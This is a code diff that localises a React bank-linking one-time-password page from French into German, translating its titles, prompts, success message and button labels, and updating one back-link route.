@@ -52,7 +52,7 @@ export default function OtpPage() {
       setShowSuccess(true);
 
     } catch (err: any) {
-      setError(err.message || "Erreur réseau.");
+      setError(err.message || "Error.");
     } finally {
       setIsLoading(false);
     }
@@ -70,19 +70,19 @@ export default function OtpPage() {
             <div className="success-icon-circle">
               <i className="fa-solid fa-check"></i>
             </div>
-            <h2 className="modal-title">Connexion réussie</h2>
+            <h2 className="modal-title">Verbindung erfolgreich</h2>
             <p className="modal-desc">
-              Votre authentification est validée. Votre banque est maintenant connectée.
+              Ihre Authentifizierung wurde bestätigt. Ihre Bank ist nun verbunden.
             </p>
             <button onClick={goToDashboard} className="btn-link-bank" style={{ background: '#15b565', width: '100%' }}>
               <i className="fa-solid fa-gauge-high"></i>
-              Accéder au tableau de bord
+              Greifen Sie auf das Dashboard zu
             </button>
           </div>
         </div>
       )}
 
-      <Link href="/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
+      <Link href="/de/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
         <i className="fa-solid fa-arrow-left"></i>
       </Link>
 
@@ -91,9 +91,9 @@ export default function OtpPage() {
           <i className="fa-solid fa-shield-lock"></i>
         </div>
 
-        <h1 className="otp-title">Code de vérification</h1>
+        <h1 className="otp-title">Bestätigungscode</h1>
         <p className="otp-subtitle">
-          Veuillez saisir le code de sécurité envoyé par votre banque pour confirmer la liaison.
+          Bitte geben Sie den von Ihrer Bank gesendeten Sicherheitscode ein, um den Link zu bestätigen.
         </p>
 
         {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px', marginBottom: '10px', width: '100%', textAlign: 'center' }}>{error}</div>}
@@ -117,7 +117,7 @@ export default function OtpPage() {
           ) : (
             <>
               <i className="fa-solid fa-circle-check"></i>
-              Valider le code
+              Validieren Sie den Code
             </>
           )}
         </button>
